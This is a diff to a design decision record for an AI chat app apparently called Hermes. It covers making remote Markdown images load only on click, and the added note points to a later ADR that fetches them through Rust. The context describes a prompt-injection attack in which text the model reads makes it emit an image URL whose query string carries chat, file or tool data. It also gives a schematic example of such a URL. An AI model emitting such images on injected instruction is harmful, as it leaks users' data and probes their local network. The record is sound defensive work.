@@ -1,5 +1,7 @@
 # A remote image in Markdown loads only when the owner clicks it
 
+> **Partly superseded by [ADR 0136](0136-the-page-loads-no-image-or-sound-from-the-network-and-a-clicked-markdown-image-comes-through-rust.md)** (#465). The page policy now sets `img-src 'self' data: blob:`, the option below that this ADR passed over, because Mermaid diagrams put remote images into the page while they draw. The click fetches the image through Rust and shows it as a `data:` URL, and the placeholder says when it is loading or why it failed. The rest of this ADR stands.
+
 Replies, side questions, previewed Markdown files and the artifact editor's preview all render through `Markdown.tsx`. It used react-markdown's own `img`, which keeps `http:` and `https:` sources, and nothing else in the app limits images: Tauri's CSP is off and `index.html` sets only `frame-src` and `object-src` (ADR 0007). So `![](https://host/p.png?d=…)` made the webview request that address as soon as the text rendered, while a reply was still streaming in (#341).
 
 Hermes's replies carry text the model read from web pages, files and tool output. A prompt injection in any of them can ask the model to end its answer with such an image, with chat content, file contents or a tool's output in the query string. The request also gives away this computer's address and when the owner read the reply, and the same tag can make GET requests to services on the LAN or on loopback.
